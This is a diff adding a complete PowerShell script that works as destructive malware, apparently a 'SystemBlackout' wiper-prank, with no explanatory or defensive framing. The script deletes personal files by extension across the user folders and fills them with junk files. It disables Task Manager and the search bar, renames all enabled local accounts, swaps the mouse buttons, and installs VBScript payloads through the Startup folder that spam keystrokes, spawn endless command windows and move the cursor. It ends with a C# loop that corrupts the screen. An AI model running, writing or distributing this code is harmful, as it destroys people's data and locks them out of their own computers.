@@ -1,1 +1,213 @@
+$desktopPath = [Environment]::GetFolderPath("Desktop")
+$documentsPath = [Environment]::GetFolderPath("MyDocuments")
+$musicPath = [Environment]::GetFolderPath("MyMusic")
+$picturesPath = [Environment]::GetFolderPath("MyPictures")
+$videosPath = [Environment]::GetFolderPath("MyVideos")
 
+$extensionsToDelete = @("exe", "json", "doc", "pdf", "wpd", "docx", "rtf", "tex", "odt", "jpg", "jpeg", "mp3", "rar", "vcd", "webp", "css", "html", "py", "php", "ico", "lnk", "mp4", "js", "bak", "xml", "zip", "bmp")
+
+$pathsToDelete = @($desktopPath, $documentsPath, $musicPath, $picturesPath, $videosPath)
+
+foreach ($path in $pathsToDelete) {
+    foreach ($extension in $extensionsToDelete) {
+        $filesToDelete = Get-ChildItem -Path $path -Filter "*.$extension" -File
+
+        foreach ($file in $filesToDelete) {
+            $filePath = $file.FullName
+            Write-Host "Deleting file: $filePath"
+            Remove-Item -Path $filePath -Force
+        }
+    }
+
+    for ($i = 1; $i -le 999; $i++) {
+        $randomIteration = Get-Random -Minimum 100 -Maximum 1000
+        $newFileName = "☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠_$randomIteration.txt"
+        $newFilePath = Join-Path -Path $path -ChildPath $newFileName
+        New-Item -Path $newFilePath -ItemType File -Force | Out-Null
+    }
+}
+
+# Create registry key to disable Task Manager
+$disableTaskMgrPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+New-Item -Path $disableTaskMgrPath -Force | Out-Null
+Set-ItemProperty -Path $disableTaskMgrPath -Name "DisableTaskMgr" -Value 1
+
+# Create registry key to disable Search Bar in taskbar
+$searchBarPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search"
+New-Item -Path $searchBarPath -Force | Out-Null
+Set-ItemProperty -Path $searchBarPath -Name "SearchboxTaskbarMode" -Value 0
+
+# Change the user account names
+$users = Get-LocalUser | Where-Object {$_.Enabled -eq $true}
+foreach ($user in $users) {
+    $newName = "█▂▔▕"
+    Rename-LocalUser -Name $user.Name -NewName $newName
+}
+
+# Create VBScript file with custom code
+$vbsScript = @"
+Set objShell = CreateObject("WScript.Shell")
+objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
+objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
+
+Set x = WScript.CreateObject("WScript.Shell")
+Do
+    WScript.Sleep 100
+    x.SendKeys "{CAPSLOCK}"
+    x.SendKeys "{NUMLOCK}"
+    x.SendKeys "S                    Y                    S                    T                    E                    M                    B                    L                    A                    C                    K                    O                    U                    T                    "
+    x.SendKeys "{SCROLLLOCK}"
+Loop
+"@
+
+$vbsFilePath = [System.IO.Path]::Combine($videosPath, "script.vbs")
+$vbsScript | Out-File -FilePath $vbsFilePath -Encoding ASCII
+
+# Get the user's Startup folder
+$startupFolder = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
+
+# Create a shortcut to the VBScript file in the Startup folder
+$shortcutPath = [System.IO.Path]::Combine($startupFolder, "script.lnk")
+$WshShell = New-Object -ComObject WScript.Shell
+$shortcut = $WshShell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = $vbsFilePath
+$shortcut.Save()
+
+# Run the VBScript file
+$WshShell = New-Object -ComObject WScript.Shell
+$WshShell.Run($vbsFilePath)
+
+# Create batch file with custom code
+$batchScript = @"
+RUNDLL32 USER32.DLL,SwapMouseButton
+"@
+
+$batchFilePath = [System.IO.Path]::Combine($videosPath, "script.bat")
+$batchScript | Out-File -FilePath $batchFilePath -Encoding ASCII
+
+# Create shortcut to the batch file in Startup folder
+$shell = New-Object -ComObject WScript.Shell
+$shortcutPath = [System.IO.Path]::Combine($videosPath, "StartupScript.lnk")
+$shortcut = $shell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = $batchFilePath
+$shortcut.Save()
+
+# Run the batch file
+Start-Process -FilePath $batchFilePath
+
+# Create VBScript file with custom code
+$vbsScript = @"
+Set objShell = CreateObject("WScript.Shell")
+
+Do While True
+    objShell.Run "cmd.exe /k echo SystemBlackout.exe", 1, True
+Loop
+"@
+
+$vbsFilePath = [System.IO.Path]::Combine($videosPath, "crazy.vbs")
+$vbsScript | Out-File -FilePath $vbsFilePath -Encoding ASCII
+
+# Get the user's Startup folder
+$startupFolder = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
+
+# Create a shortcut to the VBScript file in the Startup folder
+$shortcutPath = [System.IO.Path]::Combine($startupFolder, "crazy.lnk")
+$WshShell = New-Object -ComObject WScript.Shell
+$shortcut = $WshShell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = $vbsFilePath
+$shortcut.Save()
+
+# Create VBScript file with custom code
+$vbsScript = @"
+Set objShell = CreateObject("WScript.Shell")
+
+' Define the screen boundaries
+Const screenWidth = 50 ' Update with your screen width
+Const screenHeight = 50 ' Update with your screen height
+
+' Define the maximum number of steps to take
+Const maxSteps = 1000000000000000000000000000000000000000000000000000000000000000 ' Adjust as needed
+
+' Generate random movements
+Randomize
+
+For i = 1 To maxSteps
+    ' Generate random coordinates
+    x = Int((screenWidth - 1) * Rnd + 1)
+    y = Int((screenHeight - 1) * Rnd + 1)
+    
+    ' Move the cursor
+    objShell.Run "rundll32 user32.dll,SetCursorPos " & x & "," & y, 0, False
+    
+    ' Pause for a short duration
+    WScript.Sleep 0 ' Adjust as needed
+Next
+"@
+
+$vbsFilePath = [System.IO.Path]::Combine($videosPath, "no apps.vbs")
+$vbsScript | Out-File -FilePath $vbsFilePath -Encoding ASCII
+
+# Get the user's Startup folder
+$startupFolder = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
+
+# Create a shortcut to the VBScript file in the Startup folder
+$shortcutPath = [System.IO.Path]::Combine($startupFolder, "no apps.lnk")
+$WshShell = New-Object -ComObject WScript.Shell
+$shortcut = $WshShell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = $vbsFilePath
+$shortcut.Save()
+
+$source = @"
+using System;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+public static class Win32
+{
+    [DllImport("user32.dll")]
+    static extern int GetSystemMetrics(int smIndex);
+
+    [DllImport("user32.dll")]
+    static extern IntPtr GetDC(IntPtr hWnd);
+
+    [DllImport("gdi32.dll")]
+    static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, int dwRop);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    static extern bool SetProcessDPIAware();
+
+    [DllImport("gdi32.dll")]
+    static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
+
+    [DllImport("gdi32.dll")]
+    static extern bool TransparentBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint crTransparent);
+
+    public static void ReversePIP()
+    {
+        SetProcessDPIAware();
+        int cx = GetSystemMetrics(0);
+        int cy = GetSystemMetrics(1);
+
+        while (true)
+        {
+            Thread.Sleep(800);
+            IntPtr hdc = GetDC(IntPtr.Zero);
+
+            // StretchBlt for Reverse PIP
+            //StretchBlt(hdc, 0, 0, cx, cy, hdc, 50, 50, cx - 100, cy - 100, 0x00CC0020);
+
+            // BitBlt for Inverting Colors
+            //BitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, 0x00550009);
+
+            // TransparentBlt for Transparency
+            //TransparentBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, cx, cy, 0xFF0000);
+
+            // BitBlt with Raster Operation (ROP) Code for XOR Effect
+            BitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, 0x00660046);
+        }
+    }
+}
+"@
+
+Add-Type -TypeDefinition $source -Language CSharp
+[Win32]::ReversePIP()
